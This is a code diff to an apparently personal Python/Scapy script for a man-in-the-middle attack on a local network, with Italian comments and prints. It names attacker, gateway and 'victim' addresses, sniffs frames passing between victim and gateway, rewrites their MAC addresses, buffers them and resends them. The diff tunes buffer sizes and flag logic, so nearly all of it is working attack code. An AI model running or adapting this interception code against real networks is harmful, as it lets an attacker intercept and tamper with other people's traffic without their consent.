@@ -11,9 +11,9 @@ my_ip='192.168.20.184'
 gateway_ip='192.168.20.1'
 victim_ip='192.168.20.101'
 
-number_gateway=3
-number_victim=3
-svuotato=False
+number_gateway=5
+number_victim=1
+svuotato=True
 old_pckt = []
 pckt_buffer_gateway=[]
 pckt_buffer_victim=[]
@@ -70,21 +70,24 @@ def buffered_sniff(pckt):
 		if len(pckt_buffer_victim)<number_victim:
 			pckt[Ether].dst = gateway_mac
 			pckt_buffer_victim.append(pckt)
-		else:
+		#elif svuotato==True:
+		else:		
 			t.do_run=False
 			t.join()
 			for i in range(number_victim):
 				sendp(pckt_buffer_victim[i],verbose=0)
+				chi_e_h()
 				print("inviata replica a gateway %d",i)
-			svuotato=True
+			svuotato=False
 			pckt_buffer_victim*=0
 			t = threading.Thread(target=sono_h)
 			t.start()
 			
 	elif (pckt[Ether].dst==victim_mac and pckt[Ether].src==gateway_mac):
 		if len(pckt_buffer_gateway)<number_gateway:
+			pckt[Ether].src = my_mac
 			pckt_buffer_gateway.append(pckt)
-		elif svuotato==True:
+		else:
 			t.do_run=False
 			t.join()	
 			chi_e_h()
@@ -93,7 +96,7 @@ def buffered_sniff(pckt):
 				print("inviata replica a vittima  %d",i)
 			t = threading.Thread(target=sono_h)
 			t.start()
-			svuotato=False	
+			svuotato=True	
 			
 			pckt_buffer_gateway*=0
 
@@ -123,6 +126,6 @@ def chi_e_h():
 
 t = threading.Thread(target=sono_h)
 t.start()
-print("ciAOO")
+print("ciAOdfO")
 sniff(lfilter=lambda d: (d.dst==my_mac and d.src==victim_mac) or (d.dst==victim_mac and d.src==gateway_mac), prn=buffered_sniff)
 
